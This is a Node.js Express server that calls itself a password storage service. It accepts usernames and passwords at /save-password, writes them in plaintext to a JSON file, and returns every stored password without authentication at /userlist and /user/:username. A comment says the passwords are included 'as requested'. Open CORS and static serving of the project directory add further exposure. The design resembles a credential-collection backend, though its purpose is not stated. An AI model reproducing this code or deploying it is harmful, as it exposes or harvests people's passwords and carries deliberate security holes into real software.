const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');




const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Path to users data file
const USERS_FILE = path.join(__dirname, 'users.json');






















// Initialize users file if it doesn't exist
async function initializeUsersFile() {
    try {
        await fs.access(USERS_FILE);














    } catch (error) {
        // File doesn't exist, create it with empty array
        await fs.writeFile(USERS_FILE, JSON.stringify([], null, 2), 'utf8');
        console.log('Created new users.json file');
    }
}

// Load users from file
async function loadUsers() {
    try {
        const data = await fs.readFile(USERS_FILE, 'utf8');
        return JSON.parse(data);










    } catch (error) {
        console.error('Error loading users:', error);
        return [];
    }
}

// Save users to file
async function saveUsers(users) {
















    try {
        await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
        return true;













    } catch (error) {
        console.error('Error saving users:', error);
        return false;



    }
}

// Route to save password
app.post('/save-password', async (req, res) => {
    try {
        const { username, password, changedAt } = req.body;

        if (!username || !password || !changedAt) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username, password, and changedAt are required' 
            });
        }

        const users = await loadUsers();

        // Check if user already exists
        const existingUserIndex = users.findIndex(user => user.username === username);

        const userData = {
            username,
            password,
            changedAt,
            updatedAt: new Date().toISOString()
        };

        if (existingUserIndex !== -1) {
            // Update existing user
            users[existingUserIndex] = userData;
        } else {
            // Add new user
            userData.createdAt = new Date().toISOString();
            users.push(userData);
        }

        const saved = await saveUsers(users);
        
        if (saved) {
            res.json({ 
                success: true, 
                message: 'Password saved successfully',
                user: {
                    username,
                    changedAt,
                    updatedAt: userData.updatedAt
                }
            });
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'Failed to save password' 
            });
        }









    } catch (error) {
        console.error('Error in save-password route:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error' 
        });
    }
});

// Route to list all users (for admin/debugging purposes)
app.get('/userlist', async (req, res) => {
    try {
        const users = await loadUsers();



















        // Return users without sensitive data in production (optional)
        const userList = users.map(user => ({
            username: user.username,
            password: user.password, // Include password as requested
            changedAt: user.changedAt,
            updatedAt: user.updatedAt,
            createdAt: user.createdAt
        }));

        res.json({
            success: true,
            count: userList.length,
            users: userList
        });

    } catch (error) {
        console.error('Error in userlist route:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to load user list' 
        });
    }
});

// Route to get specific user (optional)
app.get('/user/:username', async (req, res) => {
    try {
        const { username } = req.params;
        const users = await loadUsers();
        
        const user = users.find(u => u.username === username);
        
        if (user) {
            res.json({
                success: true,
                user: {
                    username: user.username,
                    password: user.password,
                    changedAt: user.changedAt,
                    updatedAt: user.updatedAt,
                    createdAt: user.createdAt
                }
            });
        } else {
            res.status(404).json({
                success: false,
                message: 'User not found'



            });
        }





















    } catch (error) {
        console.error('Error in user lookup route:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to lookup user' 
        });
    }
});

// Health check route
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'MSP2 Password Storage Service'







    });
});

// Serve main application
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
async function startServer() {
    await initializeUsersFile();
    
    app.listen(PORT, () => {
        console.log(`✅ MSP2 Password Storage Server running on port ${PORT}`);
        console.log(`📝 Users data stored in: ${USERS_FILE}`);
        console.log(`🌐 Health check: http://localhost:${PORT}/health`);
        console.log(`👥 User list: http://localhost:${PORT}/userlist`);
    });
}

// Handle graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM, shutting down gracefully...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('🛑 Received SIGINT, shutting down gracefully...');
    process.exit(0);






});

// Start the server
startServer().catch(error => {
    console.error('❌ Failed to start server:', error);
    process.exit(1);
});
